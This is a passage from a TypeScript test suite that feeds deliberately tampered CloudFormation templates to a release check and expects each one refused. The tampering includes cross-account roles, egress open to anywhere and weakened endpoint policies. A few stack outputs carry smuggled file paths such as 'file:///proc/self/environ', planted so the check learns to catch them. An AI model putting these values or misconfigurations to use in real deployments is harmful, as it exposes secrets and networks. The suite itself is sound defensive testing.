    'AWS::ElasticLoadBalancingV2::ListenerRule',
    'AWS::ElasticLoadBalancingV2::LoadBalancer',
    'AWS::ElasticLoadBalancingV2::TargetGroup',
    'AWS::IAM::Role',
    'AWS::Lambda::Function',
    'AWS::Logs::LogGroup',
    'AWS::Route53::RecordSet',
    'AWS::SSM::Parameter',
    'AWS::SecretsManager::Secret',
    'Custom::VpcRestrictDefaultSG',
  ]

  // Every type the check admits holds its keys: a key no synth writes for it is refused (a role's and the handler
  // function's by the rules that held them before, the rest by the new one).
  it.each(TYPES)(
    'refuses a key the workload synth never writes on a %s (round 10)',
    type => {
      const expected = type === 'AWS::IAM::Role' ? OWN_ROLE : type === 'AWS::Lambda::Function' ? HANDLER : KEYS
      expect(
        check(
          changed(type, resource => {
            resource.Properties.Extra = 'x'
          }),
        ),
      ).toBe(expected)
    },
    30_000,
  )

  it.each([
    // A resource's own keys and the property keys a path would read two ways.
    [
      'a resource condition',
      changed('AWS::EC2::SecurityGroup', resource => {
        resource.Condition = 'Open'
      }),
      KEYS,
    ],
    [
      "metadata cfn-init would read, on the handler's function",
      changed('AWS::Lambda::Function', resource => {
        resource.Metadata = { 'AWS::CloudFormation::Init': { config: {} } }
      }),
      KEYS,
    ],
    [
      'a key holding the path separator',
      changed('AWS::ECS::Cluster', resource => {
        resource.Properties.ClusterSettings_ = 'x'
      }),
      KEYS,
    ],
    // A task definition: its containers' secrets, environment files, roles, image, logs and tags.
    [
      "a container's secret from another of its stage's parameters",
      changed(
        'AWS::ECS::TaskDefinition',
        (resource, template) => {
          const secrets = firstContainer(resource).Secrets as Array<Record<string, unknown>>
          ;(secrets[0] as Record<string, unknown>).ValueFrom = {
            Ref: parameterFor(template, '/hearth/nonprod/valkey/endpoint'),
          }
        },
        'ApiTask',
      ),
      ECS,
    ],
    [
      "a container's secret by another account's ARN",
      changed(
        'AWS::ECS::TaskDefinition',
        resource => {
          const secrets = firstContainer(resource).Secrets as Array<Record<string, unknown>>
          ;(secrets[0] as Record<string, unknown>).ValueFrom = arnOf(
            'secretsmanager',
            'ap-southeast-1',
            elsewhere,
            'secret:x',
          )
        },
        'ApiTask',
      ),
      KEYS,
    ],
    [
      "a container's environment files",
      changed('AWS::ECS::TaskDefinition', resource => {
        firstContainer(resource).EnvironmentFiles = [{ Type: 's3', Value: arnOf('s3', '', '', 'elsewhere/x.env') }]
      }),
      KEYS,
    ],
    [
      'a task role outside the workload, in the account',
      changed('AWS::ECS::TaskDefinition', resource => {
        resource.Properties.TaskRoleArn = ownRole('hearth-gh-deploy')
      }),
      ECS,
    ],
    [
      "an execution role of another of the stage's families",
      changed(
        'AWS::ECS::TaskDefinition',
        resource => {
          resource.Properties.ExecutionRoleArn = ownRole('hearth-nonprod-api-exec')
        },
        'WorkerTask',
      ),
      ECS,
    ],
    [
      "a task role of another account's",
      changed('AWS::ECS::TaskDefinition', resource => {
        resource.Properties.TaskRoleArn = arnOf('iam', '', elsewhere, 'role/x')
      }),
      KEYS,
    ],
    [
      "an image in another account's registry",
      changed('AWS::ECS::TaskDefinition', resource => {
        const image = firstContainer(resource).Image as { 'Fn::Join': [string, unknown[]] }
        image['Fn::Join'][1][0] = elsewhere
      }),
      NAMES,
    ],
    [
      'a log group outside its family',
      changed('AWS::ECS::TaskDefinition', resource => {
        firstContainer(resource).LogConfiguration.Options['awslogs-group'] = '/aws/elsewhere'
      }),
      ECS,
    ],
    [
      "a one-off's tag on a service's definition, which the break-glass role's grant reads",
      changed(
        'AWS::ECS::TaskDefinition',
        resource => {
          resource.Properties.Tags = [{ Key: 'hearth-role', Value: 'bastion' }]
        },
        'ApiTask',
      ),
      ECS,
    ],
    // A service: its network, ECS Exec, cluster and target groups.
    [
      'a public address',
      changed('AWS::ECS::Service', resource => {
        const network = resource.Properties.NetworkConfiguration as { AwsvpcConfiguration: Record<string, unknown> }
        network.AwsvpcConfiguration.AssignPublicIp = 'ENABLED'
      }),
      ECS,
    ],
    [
      'ECS Exec',
      changed('AWS::ECS::Service', resource => {
        resource.Properties.EnableExecuteCommand = true
      }),
      ECS,
    ],
    [
      "another stage's cluster",
      changed('AWS::ECS::Service', resource => {
        resource.Properties.Cluster = 'hearth-prod'
      }),
      NAMES,
    ],
    [
      'a target group from another of its parameters',
      changed(
        'AWS::ECS::Service',
        (resource, template) => {
          const balancers = resource.Properties.LoadBalancers as Array<Record<string, unknown>>
          ;(balancers[0] as Record<string, unknown>).TargetGroupArn = {
            Ref: parameterFor(template, '/hearth/nonprod/valkey/endpoint'),
          }
        },
        'ApiService',
      ),
      ECS,
    ],
    // Security groups: another account's group or prefix list, and egress to anywhere.
    [
      'egress to a prefix list but S3’s',
      changed(
        'AWS::EC2::SecurityGroupEgress',
        resource => {
          resource.Properties.DestinationPrefixListId = `pl-${'0a'.repeat(8)}0`
        },
        'NetworkGroupsApiToS3',
      ),
      NETWORK,
    ],
    [
      "ingress from another account's group",
      changed('AWS::EC2::SecurityGroupIngress', resource => {
        resource.Properties.SourceSecurityGroupId = `sg-${'0a'.repeat(8)}0`
        resource.Properties.SourceSecurityGroupOwnerId = elsewhere
      }),
      KEYS,
    ],
    [
      'inline egress to anywhere',
      changed(
        'AWS::EC2::SecurityGroup',
        resource => {
          resource.Properties.SecurityGroupEgress = [{ CidrIp: '0.0.0.0/0', Description: 'x', IpProtocol: '-1' }]
        },
        'NetworkGroupsApi',
      ),
      NETWORK,
    ],
    // VPC endpoints: their policies and services.
    [
      'an endpoint statement open to every principal',
      changed(
        'AWS::EC2::VPCEndpoint',
        resource => {
          const policy = resource.Properties.PolicyDocument as { Statement: unknown[] }
          policy.Statement.push({ Effect: 'Allow', Principal: { AWS: '*' }, Action: 's3:GetObject', Resource: '*' })
        },
        'EndpointsS3',
      ),
      NETWORK,
    ],
    [
      "an endpoint bound to another organisation's principals",
      changed(
        'AWS::EC2::VPCEndpoint',
        resource => {
          const policy = resource.Properties.PolicyDocument as {
            Statement: Array<{ Condition: { StringEquals: Record<string, unknown> } }>
          }
          const first = policy.Statement[0]
          if (first === undefined) throw new Error('no statement')
          first.Condition.StringEquals['aws:PrincipalOrgID'] = ['o', 'a'.repeat(10)].join('-')
        },
        'EndpointsEcrApi',
      ),
      KEYS,
    ],
    [
      "an endpoint to another account's service",
      changed('AWS::EC2::VPCEndpoint', resource => {
        resource.Properties.ServiceName = `com.amazonaws.vpce.ap-southeast-1.vpce-svc-${'0a'.repeat(8)}0`
      }),
      NETWORK,
    ],
    // The load balancer, its target groups, listener and record.
    [
      "the load balancer's access logs",
      changed('AWS::ElasticLoadBalancingV2::LoadBalancer', resource => {
        const attributes = resource.Properties.LoadBalancerAttributes as unknown[]
        attributes.push({ Key: 'access_logs.s3.enabled', Value: 'true' }, { Key: 'access_logs.s3.bucket', Value: 'x' })
      }),
      NETWORK,
    ],
    [
      'a target registered by its address',
      changed('AWS::ElasticLoadBalancingV2::TargetGroup', resource => {
        resource.Properties.Targets = [{ Id: [192, 0, 2, 10].join('.'), Port: 3000 }]
      }),
      KEYS,
    ],
    [
      'a listener redirecting elsewhere',
      changed('AWS::ElasticLoadBalancingV2::Listener', resource => {
        resource.Properties.DefaultActions = [
          { Type: 'redirect', RedirectConfig: { Host: 'elsewhere.invalid', StatusCode: 'HTTP_301' } },
        ]
      }),
      KEYS,
    ],
    [
      'a record aliased to another target',
      changed('AWS::Route53::RecordSet', resource => {
        const alias = resource.Properties.AliasTarget as Record<string, unknown>
        alias.DNSName = { 'Fn::Join': ['', ['dualstack.', 'elsewhere.invalid']] }
      }),
      NETWORK,
    ],
    // Log groups, the secret, flow logs and the cache: keys that name or send to another place.
    [
      "a log group's resource policy",
      changed('AWS::Logs::LogGroup', resource => {
        resource.Properties.ResourcePolicyDocument = { Statement: [] }
      }),
      KEYS,
    ],
    [
      "a log group's key",
      changed('AWS::Logs::LogGroup', resource => {
        resource.Properties.KmsKeyId = arnOf('kms', 'ap-southeast-1', elsewhere, 'key/x')
      }),
      KEYS,
    ],
    [
      "a log group of another stage's",
      changed('AWS::Logs::LogGroup', resource => {
        resource.Properties.LogGroupName = '/hearth/prod/api'
      }),
      NAMES,
    ],
    [
      "the secret's replica in another region",
      changed('AWS::SecretsManager::Secret', resource => {
        resource.Properties.ReplicaRegions = [{ Region: 'us-east-1' }]
      }),
      KEYS,
    ],
    [
      "the secret's key",
      changed('AWS::SecretsManager::Secret', resource => {
        resource.Properties.KmsKeyId = arnOf('kms', 'ap-southeast-1', elsewhere, 'key/x')
      }),
      KEYS,
    ],
    [
      'flow logs delivered elsewhere',
      changed('AWS::EC2::FlowLog', resource => {
        resource.Properties.LogDestination = arnOf('s3', '', '', 'elsewhere')
      }),
      KEYS,
    ],
    [
      'a cache seeded from a snapshot',
      changed('AWS::ElastiCache::ReplicationGroup', resource => {
        resource.Properties.SnapshotArns = [arnOf('s3', '', '', 'elsewhere/x.rdb')]
      }),
      KEYS,
    ],
    // The handler's function and its custom resource.
    [
      "a layer on the handler's function",
      changed('AWS::Lambda::Function', resource => {
        resource.Properties.Layers = [arnOf('lambda', 'ap-southeast-1', elsewhere, 'layer:x:1')]
      }),
      HANDLER,
    ],
    [
      'the handler acting in another account',
      changed('Custom::VpcRestrictDefaultSG', resource => {
        resource.Properties.Account = elsewhere
      }),
      KEYS,
    ],
    // Roles: their trust and their grants' resources.
    [
      'a role trusted by another service',
      changed(
        'AWS::IAM::Role',
        resource => {
          const trust = resource.Properties.AssumeRolePolicyDocument as {
            Statement: Array<{ Principal: Record<string, unknown> }>
          }
          const first = trust.Statement[0]
          if (first !== undefined) first.Principal.Service = 'ec2.amazonaws.com'
        },
        'RolesApiTask',
      ),
      STORED,
    ],
    [
      'a role trusted by another account',
      changed(
        'AWS::IAM::Role',
        resource => {
          const trust = resource.Properties.AssumeRolePolicyDocument as {
            Statement: Array<{ Principal: Record<string, unknown> }>
          }
          const first = trust.Statement[0]
          if (first !== undefined) first.Principal = { AWS: arnOf('iam', '', elsewhere, 'root') }
        },
        'RolesApiTask',
      ),
      KEYS,
    ],
    [
      "a role's grant on another account's resource",
      changed(
        'AWS::IAM::Role',
        resource => {
          const policies = resource.Properties.Policies as Array<{ PolicyDocument: { Statement: unknown[] } }>
          policies[0]?.PolicyDocument.Statement.push({
            Effect: 'Allow',
            Action: 's3:PutObject',
            Resource: arnOf('s3', '', '', 'elsewhere/*'),
          })
        },
        'RolesApiTask',
      ),
      NAMES,
    ],
    // An ARN of the account's own with no region is IAM's alone: another global service's (CloudFront's) is
    // outside the namespace the check reads as the stage's.
    [
      "a role's grant on a global service's resource in the account",
      changed(
        'AWS::IAM::Role',
        resource => {
          const policies = resource.Properties.Policies as Array<{ PolicyDocument: { Statement: unknown[] } }>
          policies[0]?.PolicyDocument.Statement.push({
            Effect: 'Allow',
            Action: 'cloudfront:GetDistribution',
            Resource: {
              'Fn::Join': ['', ['arn:', { Ref: 'AWS::Partition' }, ':cloudfront::', { Ref: 'AWS::AccountId' }, ':x/*']],
            },
          })
        },
        'RolesApiTask',
      ),
      NAMES,
    ],
    // Parameters: what a stack stores for the next, and what it reads.
    [
      "another account's secret stored as the stage's auth secret",
      changed(
        'AWS::SSM::Parameter',
        resource => {
          if (resource.Properties.Name !== '/hearth/nonprod/auth-secret/arn') throw new Error('not the auth secret')
          resource.Properties.Value = arnOf('secretsmanager', 'ap-southeast-1', elsewhere, 'secret:x')
        },
        'ParametersAuthSecretArn',
      ),
      NAMES,
    ],
    [
      'a security group stored by its id',
      changed(
        'AWS::SSM::Parameter',
        resource => {
          if (resource.Properties.Name !== '/hearth/nonprod/security-group/api') throw new Error('not the api group')
          resource.Properties.Value = `sg-${'0a'.repeat(8)}0`
        },
        'ParametersApiGroup',
      ),
      STORED,
    ],
    [
      "a parameter of another stage's",
      (dir: string) => {
        const path = named(nonprod(dir), 'Services', '.template.json')
        const template = read(path)
        ;(template.Parameters as Record<string, unknown>).Prod = {
          Type: 'AWS::SSM::Parameter::Value<String>',
          Default: '/hearth/prod/auth-secret/arn',
        }
        write(path, template)
        rekey(nonprod(dir), 'Services')
      },
      NAMES,
    ],
    [
      'a hearth-role tag on a subnet, which no grant should read',
      changed('AWS::EC2::Subnet', resource => {
        ;(resource.Properties.Tags as unknown[]).push({ Key: 'hearth-role', Value: 'bastion' })
      }),
      STORED,
    ],
  ] as const)(
    'refuses %s (round 10)',
    (_, plant, expected) => {
      expect(check(plant)).toBe(expected)
    },
    30_000,
  )

  // The containers and services the canonical texts read by name (round 11): AWS_CHECK, the probe, the read-back
  // and the one-offs' log stream read each definition's one container as server, and AWS_CHECK and the records
  // need the three services, each on its own family, so a release that renamed, added or dropped one passed this
  // check and then left every automatic, dispatched and drill rollback refusing.
  it.each([
    [
      "a service's container named other than server",
      changed(
        'AWS::ECS::TaskDefinition',
        resource => {
          firstContainer(resource).Name = 'app'
        },
        'ApiTask',
      ),
      ECS,
    ],
    [
      "a one-off's container named other than server",
      changed(
        'AWS::ECS::TaskDefinition',
        resource => {
          firstContainer(resource).Name = 'app'
        },
        'MigrateTask',
      ),
      ECS,
    ],
    [
      'a second container',
      changed(
        'AWS::ECS::TaskDefinition',
        resource => {
          const containers = resource.Properties.ContainerDefinitions as Container[]
          containers.push({ ...firstContainer(resource), Name: 'sidecar' })
        },
        'RealtimeTask',
      ),
      ECS,
    ],
    [
      'a Services stack without the worker',
      changed(
        'AWS::ECS::Service',
        (_resource, template) => {
          const resources = template.Resources as Record<string, Planted>
          for (const [id, each] of Object.entries(resources)) {
            const name = each.Properties.ServiceName ?? each.Properties.Family
            if (typeof name === 'string' && name.endsWith('-worker')) delete resources[id]
          }
        },
        'WorkerService',
      ),
      ECS,
    ],
    [
      "a service on another service's definition",
      changed(
        'AWS::ECS::Service',
        (resource, template) => {
          const resources = template.Resources as Record<string, Planted>
          const api = Object.keys(resources).find(id => resources[id]?.Properties.Family === 'hearth-nonprod-api')
          resource.Properties.TaskDefinition = { Ref: api }
        },
        'WorkerService',
      ),
      ECS,
    ],
    [
      "a service on a one-off's family, with that family's roles, logs and tag",
      changed(
        'AWS::ECS::TaskDefinition',
        resource => {
          resource.Properties.Family = 'hearth-nonprod-bastion'
          resource.Properties.TaskRoleArn = ownRole('hearth-nonprod-bastion-task')
          resource.Properties.ExecutionRoleArn = ownRole('hearth-nonprod-bastion-exec')
          resource.Properties.Tags = [{ Key: 'hearth-role', Value: 'bastion' }]
          firstContainer(resource).LogConfiguration.Options['awslogs-group'] = '/hearth/nonprod/bastion'
          firstContainer(resource).LogConfiguration.Options['awslogs-stream-prefix'] = 'bastion'
        },
        'WorkerTask',
      ),
      ECS,
    ],
    [
      'a service in the Tasks stack, as the Services stack writes one',
      (dir: string) => {
        const folder = nonprod(dir)
        const services = read(named(folder, 'Services', '.template.json'))
        const path = named(folder, 'Tasks', '.template.json')
        const tasks = read(path)
        const resources = tasks.Resources as Record<string, Planted>
        const worker = Object.values(services.Resources as Record<string, Planted>).find(
          each => each.Type === 'AWS::ECS::Service' && each.Properties.ServiceName === 'hearth-nonprod-worker',
        )
        const migrate = Object.keys(resources).find(id => resources[id]?.Properties.Family === 'hearth-nonprod-migrate')
        const copy = structuredClone(worker) as Planted
        delete copy.DependsOn
        copy.Properties.TaskDefinition = { Ref: migrate }
        resources.ExtraService = copy
        // The parameters it reads, as the Services stack declares them.
        const parameters = tasks.Parameters as Record<string, unknown>
        for (const [id, parameter] of Object.entries(services.Parameters as Record<string, unknown>)) {
          parameters[id] ??= parameter
        }
        write(path, tasks)
        rekey(folder, 'Tasks')
      },
      ECS,
    ],
  ] as const)(
    'refuses %s (round 11)',
    (_, plant, expected) => {
      expect(check(plant)).toBe(expected)
    },
    30_000,
  )

  // The tenth review's first attack (INPUTS-A1-01, INPUTS-A1-02, FLOW-A1-01). A release's own stage.ts, rendered
  // only for a real release, took aws:ResourceOrgID off the S3 gateway's and the interface endpoints' statements,
  // swapped the api task role's network perimeter for a grant to write any bucket, routed the isolated subnets
  // to the internet gateway and dropped a group's inline egress (EC2 then allows all), and a Services output
  // named a file aws-cli would load. Each endpoint's statements are now the synth's, its service's actions and
  // AWS-owned exceptions exactly, the S3 gateway's in every stage and the resource statement in non-prod and
  // restore (prod takes either until its profile turns it on); every task role carries the perimeter there;
  // every group holds its disallow-all egress; no route sits on a table of a subnet the isolated-subnets
  // parameter names; and each stack's outputs are the synth's, each value of its shape.
  const OUTPUTS = refused(
    "a stack's outputs aren't the workload's: an output the workload synth never writes for its stack, or a value of another shape, which the one-offs, the release checks and the read-back would read",
  )
  type Statement = Record<string, unknown> & { Condition?: { StringEquals?: Record<string, unknown> } }
  const statements = (resource: Planted) => (resource.Properties.PolicyDocument as { Statement: Statement[] }).Statement
  const perimeter = (resource: Planted) =>
    ((resource.Properties.Policies as Array<{ PolicyDocument: { Statement: Statement[] } }>)[0]?.PolicyDocument
      .Statement ?? [])[0] as Statement
  // The S3 gateway, an interface endpoint, a task role and a group, by their logical ids' prefixes.
  const S3 = 'EndpointsS3'
  const ECR_API = 'EndpointsEcrApi'
  const ECR_DKR = 'EndpointsEcrDkr'
  const API_TASK = 'RolesApiTask'
  it.each([
    [
      "the S3 gateway's statement without aws:ResourceOrgID",
      changed(
        'AWS::EC2::VPCEndpoint',
        resource => delete statements(resource)[1]?.Condition?.StringEquals?.['aws:ResourceOrgID'],
        S3,
      ),
      NETWORK,
    ],
    [
      "prod's S3 gateway statement without aws:ResourceOrgID",
      changed(
        'AWS::EC2::VPCEndpoint',
        resource => delete statements(resource)[1]?.Condition?.StringEquals?.['aws:ResourceOrgID'],
        S3,
        prod,
      ),
      NETWORK,
    ],
    [
      "the restore stage's S3 gateway statement without aws:ResourceOrgID",
      changed(
        'AWS::EC2::VPCEndpoint',
        resource => delete statements(resource)[1]?.Condition?.StringEquals?.['aws:ResourceOrgID'],
        S3,
        dir => join(dir, 'assembly-restore'),
      ),
      NETWORK,
    ],
    [
      "the S3 gateway's statement letting a delete through",
      changed(
        'AWS::EC2::VPCEndpoint',
        resource => {
          ;(statements(resource)[1] as Statement).Action = ['s3:Delete*', 's3:GetObject', 's3:ListBucket']
        },
        S3,
      ),
      NETWORK,
    ],
    [
      'the S3 gateway with a statement of its own',
      changed(
        'AWS::EC2::VPCEndpoint',
        resource => {
          statements(resource).push({ ...(statements(resource)[1] as Statement), Sid: 'More' })
        },
        S3,
      ),
      NETWORK,
    ],
    [
      'the S3 gateway as an interface endpoint',
      changed(
        'AWS::EC2::VPCEndpoint',
        resource => {
          resource.Properties.VpcEndpointType = 'Interface'
        },
        S3,
      ),
      NETWORK,
    ],
    [
      "an interface endpoint's resource statement without aws:ResourceOrgID",
      changed(
        'AWS::EC2::VPCEndpoint',
        resource => delete statements(resource)[0]?.Condition?.StringEquals?.['aws:ResourceOrgID'],
        ECR_DKR,
      ),
      NETWORK,
    ],
    [
      "a non-prod interface endpoint as prod's is now, with no resource statement",
      changed(
        'AWS::EC2::VPCEndpoint',
        resource => {
          const [first] = statements(resource)
          delete first?.Condition?.StringEquals?.['aws:ResourceOrgID']
          resource.Properties.PolicyDocument = {
            Version: '2012-10-17',
            Statement: [{ ...(first as Statement), Sid: 'OrgPrincipals' }],
          }
        },
        ECR_DKR,
      ),
      NETWORK,
    ],
    [
      "an interface endpoint's actions widened to every service's",
      changed(
        'AWS::EC2::VPCEndpoint',
        resource => {
          ;(statements(resource)[0] as Statement).Action = '*'
        },
        ECR_DKR,
      ),
      NETWORK,
    ],
    [
      "an interface endpoint's AWS-owned exception widened",
      changed(
        'AWS::EC2::VPCEndpoint',
        resource => {
          ;(statements(resource)[1] as Statement).Action = ['ecr:BatchGetImage', 'ecr:GetAuthorizationToken']
        },
        ECR_API,
      ),
      NETWORK,
    ],
    [
      "the api task role's perimeter swapped for a grant to write any bucket",
      changed(
        'AWS::IAM::Role',
        resource => {
          resource.Properties.Policies = [
            {
              PolicyName: 'hearth-task',
              PolicyDocument: {
                Version: '2012-10-17',
                Statement: [{ Sid: 'Uploads', Effect: 'Allow', Action: 's3:PutObject', Resource: '*' }],
              },
            },
          ]
        },
        API_TASK,
      ),
      STORED,
    ],
    [
      'the api task role with no policy, in the restore stage',
      changed(
        'AWS::IAM::Role',
        resource => {
          delete resource.Properties.Policies
        },
        API_TASK,
        dir => join(dir, 'assembly-restore'),
      ),
      STORED,
    ],
    [
      "the api task role's perimeter held to traffic through another of the template's resources",
      changed(
        'AWS::IAM::Role',
        (resource, template) => {
          const resources = template.Resources as Record<string, Planted>
          const gateway = Object.keys(resources).find(key => resources[key]?.Type === 'AWS::EC2::InternetGateway')
          const condition = perimeter(resource).Condition as Record<string, Record<string, unknown>>
          condition.StringNotEqualsIfExists = { 'aws:SourceVpc': { Ref: gateway } }
        },
        API_TASK,
      ),
      STORED,
    ],
    [
      "the api task role's perimeter excusing every caller",
      changed(
        'AWS::IAM::Role',
        resource => {
          const condition = perimeter(resource).Condition as Record<string, Record<string, unknown>>
          condition.BoolIfExists = { 'aws:ViaAWSService': 'true' }
        },
        API_TASK,
      ),
      STORED,
    ],
    [
      'a group with no inline egress, which EC2 opens to everything',
      changed(
        'AWS::EC2::SecurityGroup',
        resource => delete resource.Properties.SecurityGroupEgress,
        'NetworkGroupsApi',
      ),
      NETWORK,
    ],
    // The inline egress is CDK's disallow-all rule itself (ICMP type 252, code 86, to the limited broadcast
    // address), never another protocol or port to that address.
    [
      'a group whose inline egress opens every protocol to the broadcast address',
      changed(
        'AWS::EC2::SecurityGroup',
        resource => {
          resource.Properties.SecurityGroupEgress = [
            { CidrIp: '255.255.255.255/32', Description: 'Disallow all traffic', IpProtocol: '-1' },
          ]
        },
        'NetworkGroupsApi',
      ),
      NETWORK,
    ],
    // (An empty list is a leaf no synth writes, so the key hold refuses it first.)
    [
      'a group with an empty inline egress',
      changed(
        'AWS::EC2::SecurityGroup',
        resource => {
          resource.Properties.SecurityGroupEgress = []
        },
        'NetworkGroupsApi',
      ),
      KEYS,
    ],
    ...[nonprod, prod].map(
      stage =>
        [
          `a route out of an isolated subnet's table, in ${stage === nonprod ? 'non-prod' : 'prod'}`,
          changed(
            'AWS::EC2::RouteTable',
            (_, template) => {
              const resources = template.Resources as Record<string, Planted>
              const gateway = Object.keys(resources).find(key => resources[key]?.Type === 'AWS::EC2::InternetGateway')
              const table = Object.keys(resources).find(key => key.startsWith('NetworkVpcisolatedSubnet1RouteTable'))
              resources.IsolatedOut = {
                Type: 'AWS::EC2::Route',
                Properties: {
                  DestinationCidrBlock: '0.0.0.0/0',
                  GatewayId: { Ref: gateway },
                  RouteTableId: { Ref: table },
                },
              }
            },
            'NetworkVpcisolatedSubnet1',
            stage,
          ),
          NETWORK,
        ] as const,
    ),
    [
      "an isolated subnet moved onto a public subnet's table",
      changed(
        'AWS::EC2::SubnetRouteTableAssociation',
        (resource, template) => {
          const table = Object.keys(template.Resources as Record<string, Planted>).find(key =>
            key.startsWith('NetworkVpcpublicSubnet1RouteTable'),
          )
          resource.Properties.RouteTableId = { Ref: table }
        },
        'NetworkVpcisolatedSubnet1RouteTableAssociation',
      ),
      NETWORK,
    ],
    [
      'a Services output naming a file aws-cli would load',
      changed('AWS::ECS::Service', (_, template) => {
        ;(template.Outputs as Record<string, unknown>).ApiTaskDefinition = { Value: 'file:///proc/self/environ' }
      }),
      OUTPUTS,
    ],
    [
      'a Platform output',
      changed('AWS::EC2::VPC', (_, template) => {
        template.Outputs = { Vpc: { Value: { Ref: 'x' } } }
      }),
      OUTPUTS,
    ],
    [
      "the migrate output naming the probe's definition",
      changed('AWS::ECS::TaskDefinition', (_, template) => {
        const outputs = template.Outputs as Record<string, { Value: unknown }>
        if (outputs.MigrateTaskDefinition === undefined || outputs.ProbeTaskDefinition === undefined)
          throw new Error('no definitions output')
        outputs.MigrateTaskDefinition.Value = outputs.ProbeTaskDefinition.Value
      }),
      OUTPUTS,
    ],
    [
      "the Tasks output's cluster another stage's",
      changed('AWS::ECS::TaskDefinition', (_, template) => {
        const outputs = template.Outputs as Record<string, { Value: unknown }>
        if (outputs.Cluster === undefined) throw new Error('no Cluster output')
        outputs.Cluster.Value = 'file:///hearth-nonprod'
      }),
      OUTPUTS,
    ],
    [
      'the isolated subnets output written as a literal',
      changed('AWS::ECS::TaskDefinition', (_, template) => {
        const outputs = template.Outputs as Record<string, { Value: unknown }>
        if (outputs.IsolatedSubnets === undefined) throw new Error('no IsolatedSubnets output')
        outputs.IsolatedSubnets.Value = 'subnet-0123456789abcdef0'
      }),
      OUTPUTS,
    ],
    [
      'whether migrate runs, as neither true nor false',
      changed('AWS::ECS::TaskDefinition', (_, template) => {
        const outputs = template.Outputs as Record<string, { Value: unknown }>
        if (outputs.HasDatabase === undefined) throw new Error('no HasDatabase output')
        outputs.HasDatabase.Value = 'file:///etc/hostname'
      }),
      OUTPUTS,
    ],
  ] as const)(
    'refuses %s (round 10, attack 1)',
    (_, plant, expected) => {
      expect(check(plant)).toBe(expected)
    },
    30_000,
  )

  // What prod's profile turns on later passes there as it is now: an interface endpoint's resource statement with
  // its AWS-owned exception, and a task role's perimeter; and the Tasks output's revision of a definition passes
  // at its own family's.
  it.each([
    [
      "prod's interface endpoint with the resource statement on",
      changed(
        'AWS::EC2::VPCEndpoint',
        resource => {
          const [first] = statements(resource)
          const resources = { ...(first?.Condition?.StringEquals ?? {}) }
          resources['aws:ResourceOrgID'] = resources['aws:PrincipalOrgID']
          resource.Properties.PolicyDocument = {
            Version: '2012-10-17',
            Statement: [
              { ...(first as Statement), Sid: 'OrgPrincipalsToOrgResources', Condition: { StringEquals: resources } },
              { ...(first as Statement), Sid: 'OrgPrincipalsToAwsResources', Action: ['ecr:GetAuthorizationToken'] },
            ],
          }
        },
        ECR_API,
        prod,
      ),
    ],
    [
      "prod's api task role with the perimeter on",
      changed(
        'AWS::IAM::Role',
        (resource, template) => {
          const resources = template.Resources as Record<string, Planted>
          const vpc = Object.keys(resources).find(key => resources[key]?.Type === 'AWS::EC2::VPC')
          resource.Properties.Policies = [
            {
              PolicyName: 'hearth-task',
              PolicyDocument: {
                Version: '2012-10-17',
                Statement: [
                  {
                    Sid: 'NetworkPerimeter',
                    Effect: 'Deny',
                    NotAction: 'rds-db:connect',
                    Resource: '*',
                    Condition: {
                      StringNotEqualsIfExists: { 'aws:SourceVpc': { Ref: vpc } },
                      BoolIfExists: { 'aws:ViaAWSService': 'false' },
                    },
                  },
                ],
              },
            },
          ]
        },
        API_TASK,
        prod,
      ),
    ],
  ] as const)(
    'passes %s (round 10, attack 1)',
    (_, plant) => {
      expect(check(plant)).toBe('passed')
    },
    30_000,
  )

  // Round 11: IAM keeps one inline document to a policy name (CloudFormation writes each with PutRolePolicy,
  // which adds or replaces), so a second hearth-task policy holding a grant could stand where the perimeter
  // was, while the check read the perimeter among the role's statements and the diff's IAM table shows both.
  // Every role's inline policy names are strings and distinct, compared without case, in every stage.
  const grant = (name: string) => ({
    PolicyName: name,
    PolicyDocument: {
      Version: '2012-10-17',
      Statement: [{ Sid: 'Grant', Effect: 'Allow', Action: 's3:GetObject', Resource: '*' }],
    },
  })
  const secondPolicy = (name: unknown, stage: (dir: string) => string = nonprod) =>
    changed(
      'AWS::IAM::Role',
      resource => {
        const policies = (resource.Properties.Policies as unknown[] | undefined) ?? [grant('hearth-other')]
        resource.Properties.Policies = [...policies, { ...grant('x'), PolicyName: name }]
      },
      API_TASK,
      stage,
    )
  it.each([
    ['a second hearth-task policy on the api task role', secondPolicy('hearth-task')],
    [
      'a second hearth-task policy on the api task role, in the restore stage',
      secondPolicy('hearth-task', dir => join(dir, 'assembly-restore')),
    ],
    ["two policies of one name on prod's api task role", secondPolicy('hearth-other', prod)],
    ['a second policy whose name differs only in case', secondPolicy('Hearth-Task')],
    ['a policy name that is not a string', secondPolicy({ 'Fn::Join': ['', ['hearth-', 'task']] })],
  ] as const)(
    'refuses %s (round 11)',
    (_, plant) => {
      expect(check(plant)).toBe(OWN_ROLE)
    },
    30_000,
  )
  it('passes a second inline policy of another name (round 11)', () => {
    expect(check(secondPolicy('hearth-task-extra'))).toBe('passed')
  }, 30_000)

  // Round 12: the diff names each resource by its construct path (aws:cdk:path, or an artifact's logical id
  // entry for one that carries none), in its resource lines and its IAM and security group tables, never by its
  // logical id or name, and prints an added role as one line without its name. A release could label the api
  // task role as the migrate task role's (or swap the two roles' logical ids and paths, which in a restore up or
  // prod's first deploy prints byte for byte the diff of an honest release), so the prod approver read a grant on
  // the api's role as one on migrate's; and a path holding line breaks printed lines of its choosing. Every
  // resource's path is now under its stack, of plain construct ids, unique, its logical id's but for CDK's hash,
  // and a role, group, task definition or service carries the path its name, or what uses it, gives it.
  const LABEL = refused(
    "a resource's construct path, which the diff's tables name it by, isn't the synth's: under its own stack, of plain construct ids, unique as the diff prints it, its logical id's but for CDK's hash, one VPC at most and at the synth's path, and for a role, security group, task definition or service the one its name, or what names it, gives it; or a rule or parameter takes an id but CDK's own, or a resource one of theirs or an output's, under which the diff would label a resource the release removes",
  )
  const LOGICAL_ID = refused(
    "an artifact's logical id entry names a path or an id of another shape than a workload synth writes, which the diff would label a template's value by",
  )
  type Labelled = Planted & { Metadata?: Record<string, unknown> }
  const restore = (dir: string) => join(dir, 'assembly-restore')
  // Edits a stage's template of one part and re-keys it.
  const inPart =
    (stage: (dir: string) => string, part: string, change: (resources: Record<string, Labelled>) => void) =>
    (dir: string) => {
      edit(named(stage(dir), part, '.template.json'), json => change(json.Resources as Record<string, Labelled>))
      rekey(stage(dir), part)
    }
  // A logical id by its construct ids: the id itself, or with CDK's 8-hex hash.
  const idOfPrefix = (resources: Record<string, Labelled>, prefix: string) => {
    const id = Object.keys(resources).find(key => key === prefix || new RegExp(`^${prefix}[0-9A-F]{8}$`).test(key))
